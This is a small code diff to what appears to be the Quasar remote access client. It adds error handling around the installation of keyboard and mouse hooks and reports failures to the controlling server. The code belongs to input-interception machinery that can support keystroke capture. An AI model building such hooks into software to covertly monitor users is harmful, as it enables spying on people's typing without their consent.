@@ -733,10 +733,15 @@ namespace Quasar.Client.Interception
             {
                 //if (InputInterceptor.Initialize())
                 //{
-                mouseHook = new MouseHook(null);
-                keyboardHook = new KeyboardHook(null);
-                isInitialized = true;
-
+                try
+                {
+                    mouseHook = new MouseHook(null);
+                    keyboardHook = new KeyboardHook(null);
+                    isInitialized = true;
+                }
+                catch (Exception e) {
+                    client.Send(new NotifyMessageToServer { Message = "Creating KB/M hooks error: " + e.Message });
+                }
                 client.Send(new NotifyMessageToServer { Message = "KB/M driver is installed now" });
                 return true;
                 //}
